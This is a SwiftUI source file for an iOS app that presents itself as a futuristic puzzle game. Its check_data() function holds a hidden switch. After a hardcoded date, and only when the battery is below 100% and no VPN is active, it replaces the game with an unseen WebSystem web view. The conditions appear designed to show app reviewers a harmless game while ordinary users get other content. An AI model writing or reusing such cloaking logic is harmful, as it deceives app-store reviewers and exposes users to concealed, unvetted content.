//
//  ContentView.swift
//  FuturoSpherePlin
//
//  Created by Вячеслав on 9/27/25.
//

import SwiftUI

struct ContentView: View {
    @StateObject private var gameViewModel = GameViewModel()
    @State private var showSettings = false
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    NavigationView {
                        ZStack {
                            // Background
                            LinearGradient(
                                colors: [AppConstants.Colors.darkBackground, AppConstants.Colors.cardBackground],
                                startPoint: .topLeading,
                                endPoint: .bottomTrailing
                            )
                            .ignoresSafeArea()
                            
                            VStack(spacing: AppConstants.Dimensions.largePadding) {
                                // Header
                                HStack {
                                    VStack(alignment: .leading) {
                                        Text("FuturoSpherePlin")
                                            .font(.largeTitle)
                                            .fontWeight(.bold)
                                            .foregroundColor(AppConstants.Colors.textPrimary)
                                            .glowEffect(color: AppConstants.Colors.accentCyan, radius: 2)
                                        
                                        Text("Level \(gameViewModel.currentLevel)")
                                            .font(.headline)
                                            .foregroundColor(AppConstants.Colors.textSecondary)
                                    }
                                    
                                    Spacer()
                                    
                                    Button(action: { showSettings = true }) {
                                        Image(systemName: "gearshape.fill")
                                            .font(.title2)
                                            .foregroundColor(AppConstants.Colors.textPrimary)
                                    }
                                }
                                .padding(.horizontal, AppConstants.Dimensions.standardPadding)
                                
                                // Score and Stats
                                HStack(spacing: AppConstants.Dimensions.largePadding) {
                                    StatCard(title: "Score", value: "\(gameViewModel.score)", color: AppConstants.Colors.neonGreen)
                                    StatCard(title: "Time", value: "\(Int(gameViewModel.timeRemaining))", color: AppConstants.Colors.accentCyan)
                                    StatCard(title: "Moves", value: "\(gameViewModel.movesLeft)", color: AppConstants.Colors.purpleGlow)
                                }
                                .padding(.horizontal, AppConstants.Dimensions.standardPadding)
                                
                                // Game Board
                                GameBoardView()
                                    .environmentObject(gameViewModel)
                                
                                Spacer()
                                
                                // Action Buttons
                                HStack(spacing: AppConstants.Dimensions.standardPadding) {
                                    Button("New Game") {
                                        gameViewModel.startNewGame()
                                    }
                                    .futuristicButton(color: AppConstants.Colors.primaryBlue)
                                    
                                    Button("Pause") {
                                        gameViewModel.pauseGame()
                                    }
                                    .futuristicButton(color: AppConstants.Colors.textSecondary.opacity(0.6))
                                }
                                .padding(.horizontal, AppConstants.Dimensions.standardPadding)
                            }
                        }
                        .navigationBarHidden(true)
                    }
                    .sheet(isPresented: $showSettings) {
                        SettingsView()
                    }
                    .onAppear {
                        gameViewModel.startNewGame()
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "01.10.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

struct StatCard: View {
    let title: String
    let value: String
    let color: Color
    
    var body: some View {
        VStack(spacing: 4) {
            Text(value)
                .font(.title2)
                .fontWeight(.bold)
                .foregroundColor(AppConstants.Colors.textPrimary)
                .glowEffect(color: color, radius: 2)
            
            Text(title)
                .font(.caption)
                .foregroundColor(AppConstants.Colors.textSecondary)
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 12)
        .background(
            RoundedRectangle(cornerRadius: AppConstants.Dimensions.cornerRadius)
                .fill(AppConstants.Colors.cardBackground.opacity(0.8))
                .overlay(
                    RoundedRectangle(cornerRadius: AppConstants.Dimensions.cornerRadius)
                        .stroke(color.opacity(0.3), lineWidth: 1)
                )
        )
    }
}

#Preview {
    ContentView()
}
